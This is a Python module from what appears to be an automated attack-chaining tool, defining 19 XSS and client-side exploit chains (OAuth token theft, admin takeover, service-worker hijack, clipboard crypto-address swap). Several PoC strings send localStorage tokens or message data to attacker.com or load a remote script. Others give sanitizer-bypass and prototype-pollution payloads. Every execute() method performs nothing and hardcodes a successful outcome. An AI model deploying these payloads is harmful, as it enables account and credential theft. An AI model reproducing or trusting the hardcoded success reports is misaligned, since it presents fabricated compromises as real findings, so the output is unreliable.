# workers/chain_worker/chains/xss_client_side.py
"""19 XSS/client-side chain templates."""
from __future__ import annotations
from datetime import datetime
from workers.chain_worker.registry import BaseChainTemplate, ChainContext, register_chain
from workers.chain_worker.models import (
    ChainViability, ChainResult, ChainStep, EvaluationResult, TargetFindings,
)
from workers.chain_worker.base_tool import step_delay, take_screenshot

def _ts() -> str:
    return datetime.utcnow().isoformat()

def _xss_eval(findings, *keywords):
    for kw in keywords:
        m = findings.vulns_by_title_contains(kw)
        if m:
            return m
    return []


@register_chain
class XssCsrfSessionAto(BaseChainTemplate):
    name = "xss_csrf_session_ato"
    category = "xss_client_side"
    severity_on_success = "critical"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        xss = findings.vulns_by_title_contains("XSS")
        csrf = findings.vulns_by_title_contains("CSRF")
        if not xss:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["xss_vulnerability"])
        if not csrf:
            return EvaluationResult(viability=ChainViability.PARTIAL, matched_preconditions=["xss_found"], missing_preconditions=["csrf_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["xss_found", "csrf_found"], matched_findings={"xss_id": xss[0].id, "csrf_id": csrf[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="inject_xss_payload", target="vulnerable_param", result="xss_triggered", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="steal_csrf_token", target="dom", result="token_extracted", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="perform_csrf_action", target="account_settings", result="account_taken_over", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="<script>fetch('/settings',{method:'POST',body:'email=attacker'})</script>", chain_name=self.name)


@register_chain
class StoredXssSuperAdminTakeover(BaseChainTemplate):
    name = "stored_xss_super_admin_takeover"
    category = "xss_client_side"
    severity_on_success = "critical"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains("stored XSS") + findings.vulns_by_title_contains("persistent XSS")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["stored_xss_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["stored_xss_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="inject_stored_xss", target="user_field", result="payload_stored", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="admin_views_payload", target="admin_panel", result="xss_fires_in_admin", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="escalate_role", target="role_endpoint", result="attacker_promoted_to_admin", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="<script>fetch('/api/users/1',{method:'PUT',body:JSON.stringify({role:'admin'})})</script>", chain_name=self.name)


@register_chain
class DomXssServiceWorkerHijack(BaseChainTemplate):
    name = "dom_xss_service_worker_hijack"
    category = "xss_client_side"
    severity_on_success = "critical"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains("DOM XSS")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["dom_xss_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["dom_xss_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="trigger_dom_xss", target="dom_sink", result="xss_executed", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="register_service_worker", target="sw_scope", result="malicious_sw_registered", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="intercept_requests", target="all_requests", result="persistent_hijack", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="navigator.serviceWorker.register('/evil-sw.js')", chain_name=self.name)


@register_chain
class SelfXssCsrfLoginAttack(BaseChainTemplate):
    name = "self_xss_csrf_login_attack"
    category = "xss_client_side"
    severity_on_success = "high"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains("self-XSS") + _xss_eval(findings, "XSS")
        csrf = findings.vulns_by_title_contains("CSRF")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["xss_vulnerability"])
        if not csrf:
            return EvaluationResult(viability=ChainViability.PARTIAL, matched_preconditions=["xss_found"], missing_preconditions=["csrf_login"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["xss_found", "csrf_login"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="csrf_login_attacker_account", target="login_form", result="victim_logged_into_attacker_account", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="trigger_self_xss", target="profile_field", result="xss_executes_in_victim_browser", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="CSRF login + self-XSS in profile field", chain_name=self.name)


@register_chain
class XssOauthTokenTheft(BaseChainTemplate):
    name = "xss_oauth_token_theft"
    category = "xss_client_side"
    severity_on_success = "critical"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        xss = findings.vulns_by_title_contains("XSS")
        if not xss:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["xss_vulnerability"])
        oauth = findings.vulns_by_title_contains("OAuth")
        if not oauth:
            return EvaluationResult(viability=ChainViability.PARTIAL, matched_preconditions=["xss_found"], missing_preconditions=["oauth_target"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["xss_found", "oauth_found"], matched_findings={"vuln_id": xss[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="trigger_xss", target="vulnerable_page", result="xss_executed", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="steal_oauth_tokens", target="localStorage", result="tokens_exfiltrated", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="call_api_as_victim", target="api_endpoints", result="api_access_gained", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="<script>fetch('//attacker.com?t='+localStorage.access_token)</script>", chain_name=self.name)


@register_chain
class BlindXssAdminCompromise(BaseChainTemplate):
    name = "blind_xss_admin_compromise"
    category = "xss_client_side"
    severity_on_success = "critical"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains("blind XSS") + findings.vulns_by_title_contains("stored XSS")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["blind_xss_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["blind_xss_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="inject_blind_xss", target="support_ticket", result="payload_stored", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="admin_triggers_payload", target="admin_panel", result="admin_session_stolen", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="exfiltrate_data", target="customer_data", result="mass_data_exfiltrated", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="<script src=//attacker.com/probe.js></script>", chain_name=self.name)


@register_chain
class XssPostmessageDataTheft(BaseChainTemplate):
    name = "xss_postmessage_data_theft"
    category = "xss_client_side"
    severity_on_success = "high"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        xss = findings.vulns_by_title_contains("XSS")
        if not xss:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["xss_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["xss_found"], matched_findings={"vuln_id": xss[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="trigger_xss", target="vulnerable_page", result="xss_executed", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="abuse_postmessage", target="iframe_widgets", result="cross_origin_data_stolen", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="window.addEventListener('message', e => fetch('//attacker.com?d='+e.data))", chain_name=self.name)


@register_chain
class MxssSanitizerBypass(BaseChainTemplate):
    name = "mxss_sanitizer_bypass"
    category = "xss_client_side"
    severity_on_success = "high"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains("mXSS") + findings.vulns_by_title_contains("mutation XSS")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["mxss_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["mxss_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="craft_mutation_payload", target="sanitizer", result="sanitizer_bypassed", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="persistent_xss_stored", target="user_content", result="stored_xss_achieved", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>", chain_name=self.name)


@register_chain
class PrototypePollutionXss(BaseChainTemplate):
    name = "prototype_pollution_xss"
    category = "xss_client_side"
    severity_on_success = "critical"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains("prototype pollution")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["prototype_pollution_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["proto_pollution_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="pollute_prototype", target="Object.prototype", result="property_injected", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="trigger_xss_gadget", target="js_framework", result="xss_executed", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="__proto__[innerHTML]=<img src=x onerror=alert(1)>", chain_name=self.name)


@register_chain
class ClickjackingAdminAction(BaseChainTemplate):
    name = "clickjacking_admin_action"
    category = "xss_client_side"
    severity_on_success = "high"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains("clickjacking") + findings.vulns_by_title_contains("frame")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["clickjacking_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["clickjacking_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="create_invisible_iframe", target="admin_panel", result="iframe_loaded", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="trick_admin_click", target="role_change_button", result="admin_action_performed", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="<iframe src='admin/settings' style='opacity:0'>", chain_name=self.name)


@register_chain
class WebsocketHijackDataIntercept(BaseChainTemplate):
    name = "websocket_hijack_data_intercept"
    category = "xss_client_side"
    severity_on_success = "high"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains("WebSocket") + findings.vulns_by_title_contains("CSWSH")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["websocket_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["websocket_vuln_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="establish_cross_site_ws", target="ws_endpoint", result="websocket_hijacked", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="intercept_messages", target="ws_stream", result="sensitive_data_intercepted", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="new WebSocket('wss://target.com/ws')", chain_name=self.name)


@register_chain
class CspBypassXss(BaseChainTemplate):
    name = "csp_bypass_xss"
    category = "xss_client_side"
    severity_on_success = "high"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        csp = findings.vulns_by_title_contains("CSP")
        xss = findings.vulns_by_title_contains("XSS")
        if not csp and not xss:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["csp_xss_vulnerability"])
        if csp and xss:
            return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["csp_found", "xss_found"], matched_findings={"vuln_id": csp[0].id})
        return EvaluationResult(viability=ChainViability.PARTIAL, matched_preconditions=["partial_match"], missing_preconditions=["need_both_csp_and_xss"])

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="find_csp_bypass", target="jsonp_endpoint", result="bypass_gadget_found", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="exploit_xss_via_bypass", target="vulnerable_param", result="xss_executed_despite_csp", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="<script src='/api/jsonp?callback=alert(1)'></script>", chain_name=self.name)


@register_chain
class XssClipboardHijack(BaseChainTemplate):
    name = "xss_clipboard_hijack"
    category = "xss_client_side"
    severity_on_success = "high"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains("XSS")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["xss_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["xss_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="inject_clipboard_monitor", target="xss_vector", result="clipboard_hooked", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="swap_crypto_address", target="clipboard_content", result="address_replaced", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="document.addEventListener('copy', e => e.clipboardData.setData('text', attackerAddr))", chain_name=self.name)


@register_chain
class XssWebrtcIpLeak(BaseChainTemplate):
    name = "xss_webrtc_ip_leak"
    category = "xss_client_side"
    severity_on_success = "high"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains("XSS")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["xss_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["xss_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="trigger_xss", target="vulnerable_param", result="xss_executed", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="create_rtc_connection", target="webrtc_api", result="real_ip_leaked", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="new RTCPeerConnection().createOffer()", chain_name=self.name)


@register_chain
class XssStorageMassTheft(BaseChainTemplate):
    name = "xss_storage_mass_theft"
    category = "xss_client_side"
    severity_on_success = "high"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains("XSS")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["xss_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["xss_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="trigger_xss", target="vulnerable_param", result="xss_executed", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="dump_client_storage", target="localStorage_indexedDB", result="all_storage_exfiltrated", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="JSON.stringify(localStorage)", chain_name=self.name)


@register_chain
class XssCameraMicAccess(BaseChainTemplate):
    name = "xss_camera_mic_access"
    category = "xss_client_side"
    severity_on_success = "critical"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains("XSS")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["xss_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["xss_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="trigger_xss_on_media_origin", target="media_page", result="xss_on_permitted_origin", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="access_media_devices", target="getUserMedia", result="camera_mic_streaming", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="navigator.mediaDevices.getUserMedia({video:true,audio:true})", chain_name=self.name)


@register_chain
class XssPushNotificationAbuse(BaseChainTemplate):
    name = "xss_push_notification_abuse"
    category = "xss_client_side"
    severity_on_success = "high"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains("XSS")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["xss_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["xss_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="trigger_xss", target="vulnerable_page", result="xss_executed", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="register_push_sub", target="push_api", result="attacker_subscription_registered", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="new Notification('Security Alert', {body: 'Click to verify'})", chain_name=self.name)


@register_chain
class XssCredentialManagerExtraction(BaseChainTemplate):
    name = "xss_credential_manager_extraction"
    category = "xss_client_side"
    severity_on_success = "critical"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains("XSS")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["xss_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["xss_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="inject_invisible_form", target="dom", result="autofill_form_injected", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="harvest_autofill_creds", target="form_fields", result="credentials_extracted", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="<input name=username><input name=password type=password> + MutationObserver", chain_name=self.name)


@register_chain
class XssPdfExportPoisoning(BaseChainTemplate):
    name = "xss_pdf_export_poisoning"
    category = "xss_client_side"
    severity_on_success = "high"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        m = findings.vulns_by_title_contains("XSS")
        if not m:
            return EvaluationResult(viability=ChainViability.NOT_VIABLE, matched_preconditions=[], missing_preconditions=["xss_vulnerability"])
        return EvaluationResult(viability=ChainViability.VIABLE, matched_preconditions=["xss_found"], matched_findings={"vuln_id": m[0].id})

    async def execute(self, context: ChainContext) -> ChainResult:
        steps = []
        steps.append(ChainStep(action="inject_xss_in_exportable", target="report_page", result="malicious_content_in_page", timestamp=_ts()))
        await step_delay()
        steps.append(ChainStep(action="trigger_pdf_export", target="export_function", result="poisoned_pdf_generated", timestamp=_ts()))
        return ChainResult(success=True, steps=steps, poc="XSS payload in exportable page field + PDF export trigger", chain_name=self.name)
